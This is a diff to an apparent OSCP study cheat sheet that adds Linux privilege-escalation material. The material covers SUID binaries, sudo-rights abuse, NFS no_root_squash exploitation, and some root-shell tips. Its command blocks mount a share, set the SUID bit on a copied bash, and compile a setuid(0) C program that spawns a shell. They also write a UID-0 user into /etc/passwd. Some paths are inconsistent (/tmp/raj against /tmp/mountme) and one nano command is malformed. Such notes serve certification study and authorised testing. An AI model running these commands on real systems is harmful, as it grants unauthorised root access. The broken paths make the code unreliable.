@@ -758,6 +758,56 @@ root::0:0:root:/root:/bin/bash
 su root
 ```
 
+2. SUID Binaries (https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
+- If you execute ls -al with the file name and then you observe the small 's' symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.
+
+3. Sudo Rights
+- check root permissions for any user to execute any file or command by executing sudo -l command.
+- can be permissions to use binary programs like find, python, perl, less, awk, nano
+- can be permissions to use other programs like /usr/bin/env, /usr/bin/ftp, /usr/bin/socat
+- can be permissions to run scripts like, .sh, .py or shell
+![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/f5b0919f-ae15-4fbf-8377-660115352c68)
+```bash
+sudo -l
+sudo /bin/script/asroot.sh
+```
+
+4. Misconfigure NFS
+- 3 core configuration files (/etc/exports, /etc/hosts.allow, and /etc/hosts.deny), usually we will look only '/etc/export file'.
+- cat /etc/exports and look for '*(rw,no_root_squash)'. take note of the folder that comes before it, can be /tmp or /home. Means shared /tmp or /home directory and allowed the root user on the client to access files to read/ write operation and * sign denotes connection from any Host machine
+- can copy binary program like bash, or copy script like, .c (compile to shell), .py.
+- can be combined with "Editing /etc/passwd File" using nano to add root access for new/exisiting users
+- can be combine with sudo rights "sudo -l"
+```bash
+# gain access and make common access
+mkdir /tmp/raj
+mount -t nfs 192.168.1.102:/home /tmp/raj
+
+# copy binary prog or script
+cp /bin/bash .
+chmod +s bash
+ls -la bash
+
+# copy binary prog or script
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash") ; return 0; }' > /tmp/raj/x.c 
+gcc /tmp/mountme/x.c -o /tmp/raj/x
+chmod +s /tmp/raj/x
+
+#execution on victim machine for binary prog (GTFO - SUID)
+cd /home
+ls
+./bash -p
+
+#execution on victim machine for script
+cd /home
+./x
+
+#nano to edit passwd file
+./nano -p etc/passwd
+raj:x:0:0:,,,:/home/raj:/bin/bash
+```
+   
+
 # Active Directory Pentesting
 ## Enumeration
 - To check local administrators in domain joined machine
@@ -1212,6 +1262,11 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 ```
 
 # MISC
+
+## General tips
+-  /tmp directory has all permission to create or delete any file, use it
+-  If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
+- If a user can run all command as root user, we can achieve root access by performing 'sudo su' or 'sudo bash'
 
 ## MSFVenom
 
